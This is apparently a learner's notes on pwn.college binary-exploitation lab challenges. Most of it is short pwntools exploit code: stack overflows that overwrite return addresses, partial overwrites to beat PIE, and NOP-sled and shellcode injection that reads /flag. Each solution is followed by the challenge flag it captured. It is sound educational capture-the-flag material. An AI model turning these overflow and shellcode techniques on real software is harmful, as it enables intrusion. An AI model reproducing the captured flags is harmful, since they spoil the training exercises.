---
ai_date: '2025-04-27 05:30:10'
ai_summary: 'Explored various binary exploitation techniques: variable control, control
  hijack, PIEs, string lengths, shellcode (NOP sleds, null-free, hijack to mapped
  memory, hijack to shellcode), and using IDA for analysis.'
ai_tags:
- pwn
- shellcode
- exploitation
created: 2025-01-01T04:01
updated: 2025-01-01T18:35
---

[pwn.college/intro-to-cybersecurity/binary-exploitation/](https://pwn.college/intro-to-cybersecurity/binary-exploitation/)

Fun intro to pwn!
## Variable Control

```python
p.send(b"A"*(8*7+4)+p32(537906058))
# pwn.college{IbWcCEgwb_3NmxBQOakpaZ8L8mV.dhTNzMDL4MTNzYzW}
```

## Control Hijack

```python
p.send(b"A"*8*7+p64(0x4014c8)) # easy
# pwn.college{sjqEokLrLnlDZW3u8G_W0W7kAGz.01M5IDL4MTNzYzW}
p.send(b"A"*8*(14+1+1+1)+p64(0x401C6F)) # 14 i64 ; 1 int ; 1 sizet ; 1 base pointer
# pwn.college{gTV54k_-ulMQYgDzC3Vh_mCftbz.0FN5IDL4MTNzYzW}
```

## Tricky Control Hijack

```python
p.send(b"A"*(121+31)+p64(0x00401d74)) # easy
# pwn.college{oR39AEc9qZaLen24njN6hKpfsaA.0VO5IDL4MTNzYzW}
p.send(b"A"*8*(8+1+1+1+1+1)+p64(0x004015FB)) # 8 i64 ; 1 i16 ; 1 int ; 1 sizet ; 1 base pointer
# pwn.college{gkl-HAozRVjCOL58ddWZgrjluSZ.0FMwMDL4MTNzYzW}
```

## PIEs

```python
p.send(b"A"*8*(9+1+1+1+1)+p16(0x037E))
# pwn.college{QD_tEkBqsGxZhFGVZqF4wVArs1c.0VMwMDL4MTNzYzW}
p.send(b"A"*8*(11+1+1+1+1)+p16(0x6D1)) # 11 i64 ; 1 char ; 1 int ; 1 sizet ; 1 base pointer
# pwn.college{kgYa6adJ7d99q5RJ3UtvPka9GeD.0lMwMDL4MTNzYzW}
```

## String Lengths

```python
p.send(b"\x00"*8*(9+1+1+1+1+1+1)+p16(0x1DD7))
# pwn.college{wOakrYJ9rSpwCNDTCo_v8r8lrpY.01MwMDL4MTNzYzW}
p.send(b"\x00"*8*(4+1+1+1+1+1+1+1)+p16(0x1E83)) # 4 i64 ; 1 int ; 1 i16 ; 1 char ; 1 sizet ; 1 int ; 1 void* ; 1 sizet ; 1 base pointer
# pwn.college{cH39TBWBTDBxBC820wjWZC8HT6I.0FNwMDL4MTNzYzW}
```

## Shellcode Basic

```python
from pwn import *
context.clear(arch='amd64')
p = process("/challenge/binary-exploitation-basic-shellcode")
sc = shellcraft.amd64.linux.cat('/flag')
# sc = shellcraft.execve(path="/bin/cat", argv=["/flag"])
# sc = shellcraft.sh()
sc = asm(sc)
p.send(sc)
p.interactive()
```

For some reason neither `sh` nor `/bin/cat` worked.

## Shellcode NOP Sleds

```python
from pwn import *
context.clear(arch='amd64')
p = process("/challenge/binary-exploitation-nopsled-shellcode")
sc = pwnlib.shellcraft.amd64.nop()*0x800+shellcraft.amd64.linux.cat('/flag')
sc = asm(sc)
p.send(sc)
p.interactive()
```

## Shellcode Null free

The payload from basic shellcode works.

```python
from pwn import *
context.clear(arch='amd64')
p = process("/challenge/binary-exploitation-null-free-shellcode")
sc = shellcraft.amd64.linux.cat('/flag')
sc = asm(sc)
p.send(sc)
p.interactive()
```

## Shellcode Hijack to Mapped

```python
from pwn import *
context.clear(arch='amd64')
p = process("/challenge/binary-exploitation-hijack-to-mmap-shellcode-w")
sc = shellcraft.amd64.linux.cat('/flag')
sc = asm(sc)
p.send(sc)
p.sendline()
p.send(b'A'*8*7+p64(0x15870000))
print(p.recvall().decode())
```

For the hard version, I've figured out how to make use of IDA's `rbp` stuff. `rbp` is just the base pointer location, which saves a lot more time.

```python
# __int64 buf[2]; // [rsp+20h] [rbp-20h] BYREF
p.send(b'A'*(0x20+8)+p64(0x1a317000))
```

## Shellcode Hijack to Shellcode
I tried injecting the shell code before the return address, i.e. make the return address jump back, but it didn't work.

```python
payload = sc.ljust(8*7,asm(pwnlib.shellcraft.amd64.nop())) + p64(0x00007fffffffce00)
```

Instead the shell code is injected after the return address.

```python
from pwn import *
context.clear(arch='amd64')
p = process("/challenge/binary-exploitation-hijack-to-shellcode-w")
sc = shellcraft.amd64.linux.cat('/flag')+pwnlib.shellcraft.amd64.nop()*3
sc = asm(sc)
payload = b'A'*8*7 + p64(0x00007fffffffce38+8) + sc
p.send(payload)
print(p.recvall().decode())
```

For the hard version.

```python
# __int64 buf[2]; // [rsp+20h] [rbp-20h] BYREF
payload = b'A'*(0x20+8) + p64(0x00007fffffffce38+8) + sc
```

## Conclusion

Wow, this was really helpful.

First time ever using shellcode, never knew it was this fun and easy.

Also learnt how to use IDA better.